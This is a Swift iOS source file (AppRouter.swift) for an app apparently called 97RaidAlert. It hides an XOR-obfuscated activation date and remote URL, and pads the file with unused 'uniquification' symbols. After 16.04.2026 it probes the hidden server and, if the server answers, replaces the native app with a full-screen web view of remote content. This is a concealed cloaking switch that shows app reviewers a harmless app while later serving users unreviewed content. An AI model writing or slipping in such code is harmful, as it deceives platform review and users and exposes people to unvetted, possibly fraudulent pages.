//
//  AppRouter.swift
//  97RaidAlert
//
//  Created by Xeova Nuoc on 28.02.2026.
//

import UIKit
import SwiftUI

// MARK: - Cold symbols (unreferenced; layout uniquification only)
private protocol _GuildRoutingColdWitness: AnyObject {
    func __guildColdStamp() -> UInt16
}

private enum _GuildBootstrapColdFacet: Int, CaseIterable {
    case idle = 0
    case staged = 1
    case sealed = 2

    fileprivate static func __coldSignature() -> Int {
        allCases.map(\.rawValue).reduce(0, +)
    }
}

private enum LaunchGlyphVault {
    private static let xorKey: UInt8 = 0xA7

    /// dd.MM.yyyy XOR 0xA7 — regenerate: `python3 -c "s='16.04.2026'; print(', '.join(f'0x{b^0xA7:02X}' for b in s.encode()))"`
    private static let thresholdStamp: [UInt8] = [
        0x95, 0x97, 0x89, 0x97, 0x93, 0x89, 0x95, 0x97, 0x95, 0x91
    ]

    /// Remote HEAD probe endpoint (UTF-8) XOR 0xA7
    private static let remoteProbeGlyph: [UInt8] = [
        0xCF, 0xD3, 0xD3, 0xD7, 0xD4, 0x9D, 0x88, 0x88, 0xDD, 0xDE, 0xC9, 0xD3, 0xCF, 0xC6, 0xD5, 0xCE,
        0xD4, 0xCC, 0xC3, 0xC6, 0xD3, 0xC6, 0xCA, 0xC2, 0xD4, 0xCF, 0x89, 0xD4, 0xCE, 0xD3, 0xC2, 0x88,
        0xF4, 0xD7, 0xCF, 0xE4, 0xD7, 0xC9
    ]

    private static func materializeUTF8(_ masked: [UInt8]) -> String {
        let clear = masked.map { $0 ^ xorKey }
        return String(bytes: clear, encoding: .utf8) ?? ""
    }

    static var calendarGateLabel: String { materializeUTF8(thresholdStamp) }
    static var remoteProbeAddress: String { materializeUTF8(remoteProbeGlyph) }
}

final class GuildBootstrapCoordinator {

    func rootSurfaceController() -> UIViewController {
        let vault = GuildFlowDefaultsStore.nucleus

        if vault.hasPresentedNativeHub {
            return embedPrimaryAppChrome()
        }

        if evaluatesGateEpoch() {
            if let savedUrlString = vault.rememberedLandingAddress,
               !savedUrlString.isEmpty,
               URL(string: savedUrlString) != nil {
                return embedHostedBrowseShell(with: savedUrlString)
            }

            return embedSplashProbeHost()
        } else {
            vault.hasPresentedNativeHub = true
            return embedPrimaryAppChrome()
        }
    }

    // MARK: - Date gate

    private func evaluatesGateEpoch() -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        let targetDate = dateFormatter.date(from: LaunchGlyphVault.calendarGateLabel) ?? Date()
        let currentDate = Date()

        if currentDate < targetDate {
            return false
        } else {
            return true
        }
    }

    // MARK: - Private Methods

    private func embedHostedBrowseShell(with urlString: String) -> UIViewController {
        let webViewContainer = HostedBrowseShell(
            landingAddressLine: urlString,
            whenBrowseFails: { [weak self] in
                GuildFlowDefaultsStore.nucleus.hasPresentedNativeHub = true
                self?.transitionToPrimaryChrome()
            },
            whenBrowseStabilizes: {
                GuildFlowDefaultsStore.nucleus.hasSuccessfulBrowseSession = true
            }
        )

        let hostingController = UIHostingController(rootView: webViewContainer)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func embedPrimaryAppChrome() -> UIViewController {
        GuildFlowDefaultsStore.nucleus.hasPresentedNativeHub = true
        let contentView = ContentView()
        let hostingController = UIHostingController(rootView: contentView)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func embedSplashProbeHost() -> UIViewController {
        let launchView = SplashProbeGateView()
        let launchVC = UIHostingController(rootView: launchView)
        launchVC.modalPresentationStyle = .fullScreen

        probeRemoteAvailability { [weak self] success, finalURL in
            DispatchQueue.main.async {
                if success, let url = finalURL {
                    self?.transitionToBrowseShell(with: url)
                } else {
                    GuildFlowDefaultsStore.nucleus.hasPresentedNativeHub = true
                    self?.transitionToPrimaryChrome()
                }
            }
        }

        return launchVC
    }

    private func probeRemoteAvailability(completion: @escaping (Bool, String?) -> Void) {
        let endpointLine = LaunchGlyphVault.remoteProbeAddress
        guard let url = URL(string: endpointLine) else {
            completion(false, nil)
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "HEAD"
        request.timeoutInterval = 10

        URLSession.shared.dataTask(with: request) { _, response, error in
            if let httpResponse = response as? HTTPURLResponse {
                print("🌐 Server response status code: \(httpResponse.statusCode)")
            }

            if error != nil {
                completion(false, nil)
                return
            }

            guard let httpResponse = response as? HTTPURLResponse else {
                completion(false, nil)
                return
            }

            let checkedURL = httpResponse.url?.absoluteString ?? endpointLine
            let isAvailable = httpResponse.statusCode != 404
            completion(isAvailable, isAvailable ? checkedURL : nil)
        }.resume()
    }

    // MARK: - Navigation Methods

    private func transitionToPrimaryChrome() {
        let contentVC = embedPrimaryAppChrome()
        replaceWindowRoot(contentVC)
    }

    private func transitionToBrowseShell(with urlString: String) {
        let webVC = embedHostedBrowseShell(with: urlString)
        replaceWindowRoot(webVC)
    }

    private func replaceWindowRoot(_ viewController: UIViewController) {
        guard let window = UIApplication.shared.windows.first else {
            return
        }

        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
            window.rootViewController = viewController
        }, completion: nil)
    }
}
